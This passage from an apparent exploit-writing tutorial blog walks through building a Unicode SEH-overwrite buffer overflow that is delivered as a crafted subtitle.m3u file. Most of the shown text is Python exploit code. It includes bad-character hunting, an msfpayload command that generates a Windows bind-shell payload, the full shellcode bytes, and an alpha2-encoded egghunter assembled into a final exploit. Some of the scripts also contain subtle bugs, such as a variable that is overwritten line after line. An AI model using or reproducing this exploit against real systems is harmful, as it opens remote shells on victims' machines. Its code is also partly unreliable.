"\xc3" # RETN to go to the beginning of the shellcode....<br />buffer = "\x62" * 12<br />junk2 &nbsp;= &nbsp;"\x09\x0a\x0b"<br />#\x0c\x0d\x0e<br />exploit = junk + nseh + seh + adjust + buffer + junk2<br />handler = open ("subtitle.m3u", "w")<br />handler.write(exploit)<br />handler.close()</blockquote>Still a problem. Try again with just \x09\x0a?<br /><br /><br /><blockquote class="tr_bq">#!/usr/bin/python<br />junk &nbsp;= "\x41" * 4078<br />nseh = "\x61\x62"<br />seh = "\xeb\x46" * 2<br />adjust = "\x53" # PUSH EBX<br />adjust = "\x62" # NOP padding to absorb the \x00's that will be added<br />&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;# after the \x53 instruction in memory<br />adjust = "\x58" # POP EAX &nbsp;to make eax point to the beginning of our shellcode.<br />adjust = "\x62" # NOP padding<br />adjust = "\x50" # PUSH EAX to push eax to the stack...<br />adjust = "\x62" # NOP padding<br />adjust = "\xc3" # RETN to go to the beginning of the shellcode....<br />buffer = "\x62" * 12<br />junk2 &nbsp;= &nbsp;"\x09\x0a"<br />#\x0b\x0c\x0d\x0e<br />exploit = junk + nseh + seh + adjust + buffer + junk2<br />handler = open ("subtitle.m3u", "w")<br />handler.write(exploit)<br />handler.close()</blockquote><br />And would you believe it. We still have an error. Testing out \x09 and \x0a by&nbsp;themselves&nbsp;should reveal that \x0a is another bad character. Once you are done you can take \x0a and replace the other characters back in.<br /><br /><br /><blockquote class="tr_bq">#!/usr/bin/python<br />junk &nbsp;= "\x41" * 4078<br />nseh = "\x61\x62"<br />seh = "\xeb\x46" * 2<br />adjust = "\x53" # PUSH EBX<br />adjust = "\x62" # NOP padding to absorb the \x00's that will be added<br />&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;# after the \x53 instruction in memory<br />adjust = "\x58" # POP EAX &nbsp;to make eax point to the beginning of our shellcode.<br />adjust = "\x62" # NOP padding<br />adjust = "\x50" # PUSH EAX to push eax to the stack...<br />adjust = "\x62" # NOP padding<br />adjust = "\xc3" # RETN to go to the beginning of the shellcode....<br />buffer = "\x62" * 12<br />junk2 &nbsp;= &nbsp;"\x09\x0b\x0c\x0d\x0e"<br />exploit = junk + nseh + seh + adjust + buffer + junk2<br />handler = open ("subtitle.m3u", "w")<br />handler.write(exploit)<br />handler.close()</blockquote><div>Which returns an error yet again. Try it with just \x0b and you will find its not that one? \x0d?</div><div><br /></div><div><blockquote class="tr_bq">#!/usr/bin/python<br />junk &nbsp;= "\x41" * 4078<br />nseh = "\x61\x62"<br />seh = "\xeb\x46" * 2<br />adjust = "\x53" # PUSH EBX<br />adjust = "\x62" # NOP padding to absorb the \x00's that will be added<br />&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;# after the \x53 instruction in memory<br />adjust = "\x58" # POP EAX &nbsp;to make eax point to the beginning of our shellcode.<br />adjust = "\x62" # NOP padding<br />adjust = "\x50" # PUSH EAX to push eax to the stack...<br />adjust = "\x62" # NOP padding<br />adjust = "\xc3" # RETN to go to the beginning of the shellcode....<br />buffer = "\x62" * 12<br />junk2 &nbsp;= &nbsp;"\x0d"&nbsp;</blockquote><br /><blockquote class="tr_bq">exploit = junk + nseh + seh + adjust + buffer + junk2<br />handler = open ("subtitle.m3u", "w")<br />handler.write(exploit)<br />handler.close()</blockquote></div><div>Yep thats the one. So we also can add \x0d to our list of bad characters. There are no more bad characters for that line so you can place the remaining characters from that line back and you should see them all appear in memory correctly.</div><div><br /></div><div><br /></div><div><blockquote class="tr_bq">#!/usr/bin/python<br />junk &nbsp;= "\x41" * 4078<br />nseh = "\x61\x62"<br />seh = "\xeb\x46" * 2<br />adjust = "\x53" # PUSH EBX<br />adjust = "\x62" # NOP padding to absorb the \x00's that will be added<br />&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;# after the \x53 instruction in memory<br />adjust = "\x58" # POP EAX &nbsp;to make eax point to the beginning of our shellcode.<br />adjust = "\x62" # NOP padding<br />adjust = "\x50" # PUSH EAX to push eax to the stack...<br />adjust = "\x62" # NOP padding<br />adjust = "\xc3" # RETN to go to the beginning of the shellcode....<br />buffer = "\x62" * 12<br />junk2 &nbsp;= &nbsp;"\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0b\x0d\x0e"&nbsp;</blockquote><br /><blockquote class="tr_bq">exploit = junk + nseh + seh + adjust + buffer + junk2<br />handler = open ("subtitle.m3u", "w")<br />handler.write(exploit)<br />handler.close()</blockquote>This should now work with all characters appearing correctly in memory. Repeat this process for each line that I pasted above. You should generate the following list of bad characters:<br /><br /><br /><ul><li>\x00</li><li>\x0a</li><li>\x0d</li><li>\x1a</li><li>\x3a</li><li>\x5c</li><li>\x80</li></ul><div><br /></div><h3><u>Generating The Bind Shell</u></h3>To generate the bind shell we could use msfvenom. However I found it kept on including the bad characters in my final payload. So I decided to do it the old way (aka the way I like to do it :P ) :<br /><br /><blockquote class="tr_bq">msfpayload windows/shell/bind_tcp R | msfencode -a x86 -b "\x00\x0a\x0d\x1a\x3a\x5c\x80" -t c</blockquote>This should generate you shellcode. Copy and paste it into a new file and search through it for each of the bad characters to double check that none of them slipped through. If all is good, make a new section in the code for this shellcode:<br /><br /><br /><blockquote class="tr_bq">#!/usr/bin/python<br />junk &nbsp;= "\x41" * 4078<br />nseh = "\x61\x62"<br />seh = "\xeb\x46" * 2<br />adjust = "\x53" # PUSH EBX<br />adjust = "\x62" # NOP padding to absorb the \x00's that will be added<br />&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;# after the \x53 instruction in memory<br />adjust = "\x58" # POP EAX &nbsp;to make eax point to the beginning of our shellcode.<br />adjust = "\x62" # NOP padding<br />adjust = "\x50" # PUSH EAX to push eax to the stack...<br />adjust = "\x62" # NOP padding<br />adjust = "\xc3" # RETN to go to the beginning of the shellcode....<br />buffer = "\x62" * 12<br />shellcode = (<br />"\xdb\xc2\xd9\x74\x24\xf4\xbf\xe6\xcb\xb6\xa3\x5d\x33\xc9\xb1"<br />"\x4b\x31\x7d\x19\x83\xc5\x04\x03\x7d\x15\x04\x3e\x4a\x4b\x41"<br />"\xc1\xb3\x8c\x31\x4b\x56\xbd\x63\x2f\x12\xec\xb3\x3b\x76\x1d"<br />"\x38\x69\x63\x96\x4c\xa6\x84\x1f\xfa\x90\xab\xa0\xcb\x1c\x67"<br />"\x62\x4a\xe1\x7a\xb7\xac\xd8\xb4\xca\xad\x1d\xa8\x25\xff\xf6"<br />"\xa6\x94\xef\x73\xfa\x24\x0e\x54\x70\x14\x68\xd1\x47\xe1\xc2"<br />"\xd8\x97\x5a\x59\x92\x0f\xd0\x05\x03\x31\x35\x56\x7f\x78\x32"<br />"\xac\x0b\x7b\x92\xfd\xf4\x4d\xda\x51\xcb\x61\xd7\xa8\x0b\x45"<br />"\x08\xdf\x67\xb5\xb5\xe7\xb3\xc7\x61\x62\x26\x6f\xe1\xd4\x82"<br />"\x91\x26\x82\x41\x9d\x83\xc1\x0e\x82\x12\x06\x25\xbe\x9f\xa9"<br />"\xea\x36\xdb\x8d\x2e\x12\xbf\xac\x77\xfe\x6e\xd1\x68\xa6\xcf"<br />"\x77\xe2\x45\x1b\x01\xa9\x01\xe8\x3f\x52\xd2\x66\x48\x21\xe0"<br />"\x29\xe2\xad\x48\xa1\x2c\x29\xae\x98\x88\xa5\x51\x23\xe8\xec"<br />"\x95\x77\xb8\x86\x3c\xf8\x53\x57\xc0\x2d\xf3\x07\x6e\x9e\xb3"<br />"\xf7\xce\x4e\x5b\x12\xc1\xb1\x7b\x1d\x0b\xda\x4a\x39\xe7\x8d"<br />"\xae\xbd\x19\x12\x27\x5b\x73\xba\x61\xf3\xec\x78\x56\xcc\x8b"<br />"\x83\xbd\x60\x03\x14\x8a\x6e\x93\x1b\x0b\xa5\xb7\xb0\xa4\x2e"<br />"\x4c\xdb\x71\x4e\x53\xf6\xd2\x07\xc4\x8c\xb2\x6a\x74\x90\x9f"<br />"\x1f\x76\x04\x1b\xb6\x21\xb0\x21\xef\x06\x1f\xda\xda\x1c\x96"<br />"\x4e\xa5\x4a\xd7\x9e\x25\x8b\x81\xf4\x25\xe3\x75\xac\x75\x16"<br />"\x7a\x79\xea\x8b\xef\x81\x5b\x7f\xa7\xe9\x61\xa6\x8f\xb6\x9a"<br />"\x8d\x11\x8b\x4c\xe8\x97\xfd\xfa\x18\x54"<br />)<br />junk2 &nbsp;= &nbsp;"\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0b\x0d\x0e"<br />exploit = junk + nseh + seh + adjust + buffer + junk2<br />handler = open ("subtitle.m3u", "w")<br />handler.write(exploit)<br />handler.close()</blockquote><br />&nbsp;Please note that the reason we don't encode the payload in Unicode is because you can actually find a copy of the payload that hasn't been converted into Unicode in memory. To check this do:<br /><br /><ul><li>View - Memory</li><li>Click on the first entry starting with the lowest number.</li><li>Right click and click search.</li><li>Enter a copy of some of the bytes from your code.</li><li>Observe the fact that Immunity finds a copy of your code unconverted in memory.</li></ul><br /><br /><h3><u>Generating the Unicode Egghunter + Tag</u></h3><div>To generate the last section of this exploit we will need to use skylined's alpha2 alphanumeric shellcode encoder. You can find a copy here: <a href="http://skypher.com/wiki/index.php/Www.edup.tudelft.nl/~bjwever/src/alpha2.c">alpha2.c</a>.</div><div><br /></div><div>We also need an egghunter. This was obtained from one of corelanc0d3r's&nbsp;awesome&nbsp;tutorials on egghunters. The code is recreated below (taken from&nbsp;<a href="https://www.corelan.be/index.php/2010/01/09/exploit-writing-tutorial-part-8-win32-egg-hunting/">https://www.corelan.be/index.php/2010/01/09/exploit-writing-tutorial-part-8-win32-egg-hunting/</a>)</div><div><br /></div><blockquote class="tr_bq"><pre style="background-color: #333333; border: 1px solid rgb(206, 206, 206); color: #c2c2c2; font-size: 12px; min-height: 40px; overflow: auto; padding: 5px; width: 650px;">"<span style="color: #7fec7f;">\x66\x81\xCA\xFF\x0F\x42\x52\x6A\<b><span style="color: red;">x02</span></b>\x58\xCD\x2E\x3C\x05\x5A\x74\xEF\xB8</span>".<br />"<span style="color: #7fec7f;">\x77\x30\x30\x74</span>". # this is the marker/tag: w00t<br />"<span style="color: #7fec7f;">\x8B\xFA\xAF\x75\xEA\xAF\x75\xE7\xFF\xE7</span>";</pre></blockquote><div><br /></div></div><div>The next step we will need to do is encode this egghunter into&nbsp;Unicode. To do this we take the code from above and paste it into a new file:</div><div><br /></div><blockquote class="tr_bq">#!/usr/bin/python<br />print ("\x66\x81\xCA\xFF\x0F\x42\x52\x6A\x02\x58\xCD\x2E\x3C\x05\x5A\x74\xEF\xB8\x77\x30\x30\x74\x8B\xFA\xAF\x75\xEA\xAF\x75\xE7\xFF\xE7")</blockquote><br />Run that script and redirect the output to a file called egghunter.raw. Then do:<br /><br />gcc alpha2.c -o alpha2<br /><br />and do:<br /><br />./alpha2 --unicode --uppercase eax &lt; egghunter.raw &gt; egghunter<br /><br />The send egghunter over to your host PC and add it into the exploit.<br /><br />Finally we add the tag to our exploit, making the final exploit look like this (and yes i forgot to take out junk2 in the last one in case your wondering why this one looks a little different ;) ):<br /><br /><blockquote>#!/usr/bin/python<br />junk &nbsp;= "\x41" * (4078-(len(tag + shellcode))<br />nseh = "\x61\x62"<br />seh = "\xeb\x46" * 2<br />adjust = "\x53" # PUSH EBX<br />adjust = "\x62" # NOP padding to absorb the \x00's that will be added<br />&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;# after the \x53 instruction in memory<br />adjust = "\x58" # POP EAX &nbsp;to make eax point to the beginning of our shellcode.<br />adjust = "\x62" # NOP padding<br />adjust = "\x50" # PUSH EAX to push eax to the stack...<br />adjust = "\x62" # NOP padding<br />adjust = "\xc3" # RETN to go to the beginning of the shellcode....<br />buffer = "\x62" * 12<br />tag = "w00tw00t"<br />shellcode = (<br />"\xdb\xc2\xd9\x74\x24\xf4\xbf\xe6\xcb\xb6\xa3\x5d\x33\xc9\xb1"<br />"\x4b\x31\x7d\x19\x83\xc5\x04\x03\x7d\x15\x04\x3e\x4a\x4b\x41"<br />"\xc1\xb3\x8c\x31\x4b\x56\xbd\x63\x2f\x12\xec\xb3\x3b\x76\x1d"<br />"\x38\x69\x63\x96\x4c\xa6\x84\x1f\xfa\x90\xab\xa0\xcb\x1c\x67"<br />"\x62\x4a\xe1\x7a\xb7\xac\xd8\xb4\xca\xad\x1d\xa8\x25\xff\xf6"<br />"\xa6\x94\xef\x73\xfa\x24\x0e\x54\x70\x14\x68\xd1\x47\xe1\xc2"<br />"\xd8\x97\x5a\x59\x92\x0f\xd0\x05\x03\x31\x35\x56\x7f\x78\x32"<br />"\xac\x0b\x7b\x92\xfd\xf4\x4d\xda\x51\xcb\x61\xd7\xa8\x0b\x45"<br />"\x08\xdf\x67\xb5\xb5\xe7\xb3\xc7\x61\x62\x26\x6f\xe1\xd4\x82"<br />"\x91\x26\x82\x41\x9d\x83\xc1\x0e\x82\x12\x06\x25\xbe\x9f\xa9"<br />"\xea\x36\xdb\x8d\x2e\x12\xbf\xac\x77\xfe\x6e\xd1\x68\xa6\xcf"<br />"\x77\xe2\x45\x1b\x01\xa9\x01\xe8\x3f\x52\xd2\x66\x48\x21\xe0"<br />"\x29\xe2\xad\x48\xa1\x2c\x29\xae\x98\x88\xa5\x51\x23\xe8\xec"<br />"\x95\x77\xb8\x86\x3c\xf8\x53\x57\xc0\x2d\xf3\x07\x6e\x9e\xb3"<br />"\xf7\xce\x4e\x5b\x12\xc1\xb1\x7b\x1d\x0b\xda\x4a\x39\xe7\x8d"<br />"\xae\xbd\x19\x12\x27\x5b\x73\xba\x61\xf3\xec\x78\x56\xcc\x8b"<br />"\x83\xbd\x60\x03\x14\x8a\x6e\x93\x1b\x0b\xa5\xb7\xb0\xa4\x2e"<br />"\x4c\xdb\x71\x4e\x53\xf6\xd2\x07\xc4\x8c\xb2\x6a\x74\x90\x9f"<br />"\x1f\x76\x04\x1b\xb6\x21\xb0\x21\xef\x06\x1f\xda\xda\x1c\x96"<br />"\x4e\xa5\x4a\xd7\x9e\x25\x8b\x81\xf4\x25\xe3\x75\xac\x75\x16"<br />"\x7a\x79\xea\x8b\xef\x81\x5b\x7f\xa7\xe9\x61\xa6\x8f\xb6\x9a"<br />"\x8d\x11\x8b\x4c\xe8\x97\xfd\xfa\x18\x54"<br />)<br />egghunter =<br />(<br />"PPYAIAIAIAIAQATAXAZAPA3QADAZABARALAYAIAQAIAQAPA5AAAPAZ1AI1AIAIAJ11AIAIAXA58AAPAZABABQI1AIQIAIQI1111AIAJQI1AYAZBABABABAB30APB944JBC6SQGZKOLO0B0RQZOSR88MNNOLKUPZSDJO6XT7NPNP3DTKKJ6OD5JJ6OBUK7KOYWLJA"<br />)<br />exploit = junk + tag + shellcode + nseh + seh + adjust + buffer + egghunter<br />handler = open ("subtitle.m3u", "w")<br />handler.write(exploit)<br />handler.close()</blockquote><br />Two things to note here:<br /><br /><ol><li>You have to place the tag + shellcode before the NSEH and SEH overwrite. If you were to have placed it after the egghunter, the shellcode would have ran past the end of the memory block allocated for the program and you shellcode would have been truncated.</li><li>When we adjust the length of the junk, we don't times the len of tag + shellcode by 2. This is because when we calculated the amount of &nbsp;\x41 's to use for junk, we already took into account Unicode expansion into our total offset. Thus we don't need to times the tag+shellcode by 2 to account for this.</li></ol><div><br /></div><div>Anyway thats all I have for now guys. If you want to watch a video of this in action you can see my fairly bad video down here (you will want to watch this in 720 px or higher):</div><div><br /></div><div class="separator" style="clear: both; text-align: center;"><object class="BLOGGER-youtube-video" classid="clsid:D27CDB6E-AE6D-11cf-96B8-444553540000" codebase="http://download.macromedia.com/pub/shockwave/cabs/flash/swflash.cab#version=6,0,40,0" data-thumbnail-src="http://i.ytimg.com/vi/OG5GN4KuaI4/0.jpg" height="266" width="320"><param name="movie" value="http://www.youtube.com/v/OG5GN4KuaI4?version=3&f=user_uploads&c=google-webdrive-0&app=youtube_gdata" /><param name="bgcolor" value="#FFFFFF" /><param name="allowFullScreen" value="true" /><embed width="320" height="266"  src="http://www.youtube.com/v/OG5GN4KuaI4?version=3&f=user_uploads&c=google-webdrive-0&app=youtube_gdata" type="application/x-shockwave-flash" allowfullscreen="true"></embed></object></div><div><br /></div><br /><br />Thanks for reading :)<br /><br />-tekwizz123<br /><br /><br /></div>